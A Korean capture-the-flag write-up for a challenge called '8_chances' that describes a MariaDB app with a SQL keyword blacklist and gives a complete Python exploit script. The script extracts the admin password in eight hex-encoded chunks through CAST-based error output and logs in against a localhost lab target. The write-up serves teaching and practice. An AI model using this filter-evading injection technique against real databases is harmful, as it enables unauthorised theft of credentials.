# 8_chances

## Concept

- sql injection
- mariadb

## Writeup

주요 기능을 정리해보겠습니다.
1. `reset` : `chance`를 8로 초기화합니다.
2. `test` : 입력한 쿼리를 실행시켜줍니다. 이 때 쿼리에
   `['union', 'insert', 'sleep', 'concat', 'like', 'set', '@', '!', '%', '_', '\t','\n','\r','\v','\f', '/', '*', '#']`
   을 포함하면 안 됩니다.
3. `real` : `username`과 `password`를 입력받고 이것이 `admin`의 정보와 일치하면 `flag`를 줍니다. 이 때 `username`과 `password`는
   `string.punctuation + string.whitespace + string.digits`
   을 포함하면 안 됩니다.

`test` 기능을 자세히 보겠습니다.
`chance >= 8`이면 `admin`의 `password`를 교체합니다. 그리고 `test` 실행마다 `chance`가 1씩 증가하기 때문에 한 번 정해진 `password`는 8번의 퀴리동안 유지됩니다.
## ex.py

```python
import requests

base_url = "http://localhost:10000/"

def reset():
    data = {
        "user" : "1",
        "pass" : "1",
        "testquery" : "1",
        "type" : "reset"
    }
    requests.post(base_url, data=data)

def test(testquery : str):
    data = {
        "user" : "1",
        "pass" : "1",
        "testquery" : testquery,
        "type" : "test"
    }
    res = requests.post(base_url, data=data)
    msg = res.text
    msg = msg.split('\n')[110].split('<')[1].split('>')[1]
    return msg

def real(ps : str):
    data = {
        "user" : "admin",
        "pass" : ps,
        "testquery" : "1",
        "type" : "real"
    }
    res = requests.post(base_url, data=data)
    return res.text

def lef(s : str, n : int):
    return "LEFT(" + s + f", {str(n)})"

def rig(s : str, n : int):
    return "RIGHT(" + s + f", {str(n)})"

def outline(s : str):
    return "SELECT CAST(" + s + " as UNSIGNED)"

base_payload = f"""
HEX(HEX((SELECT password FROM users WHERE username='admin')))
""".strip()

reset()
pw = ""
pw += test(outline(lef(lef(lef(base_payload, 76), 38), 19)))
pw += test(outline(rig(lef(lef(base_payload, 76), 38), 19)))
pw += test(outline(lef(rig(lef(base_payload, 76), 38), 19)))
pw += test(outline(rig(rig(lef(base_payload, 76), 38), 19)))
pw += test(outline(lef(lef(rig(base_payload, 76), 38), 19)))
pw += test(outline(rig(lef(rig(base_payload, 76), 38), 19)))
pw += test(outline(lef(rig(rig(base_payload, 76), 38), 19)))
pw += test(outline(rig(rig(rig(base_payload, 76), 38), 19)))
realpw = bytes.fromhex(bytes.fromhex(pw).decode()).decode()
print(realpw)
print(real(realpw))
```

8등분하는 방법은 여러 가지입니다. 예를 들어 `LEFT`와 `REVERSE` 함수만으로도 비슷한 논리를 이용하여 해결할 수 있습니다.